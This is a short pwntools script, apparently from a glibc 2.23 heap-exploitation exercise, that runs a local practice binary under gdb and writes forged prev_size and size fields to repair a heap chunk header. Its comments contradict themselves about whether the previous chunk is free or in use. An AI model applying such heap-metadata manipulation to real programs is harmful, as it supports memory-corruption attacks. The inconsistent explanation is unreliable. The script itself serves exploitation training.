#!/usr/bin/env python3
from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.fix_chunk'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = gdb.debug([elf.path], env=env, gdbscript='''
dir ../../../libc_versions/2.23/
''')

'''
Below is the heap layout: 
=============================

Ptr Name | Size
==============
previous   | 0xa0 (free)
-----------
current    | 0x110 (in use) <---- Fixing THIS chunk
-----------
filler     | 0x20 (in use) 
-----------

The previous chunks IS in use. So, this means that the 
'prev_size' field of the 'current' chuk is not in use. 

So, we don't need to change this value.
'''
prev_size = p64(0x0)

size = p64(0x110 | 0x1) # 0x110 is the old chunks size. 0x1 is the prev_inuse (p) chunk metadata chunk.

# Send off the data
p.sendline(prev_size + size)

p.interactive()
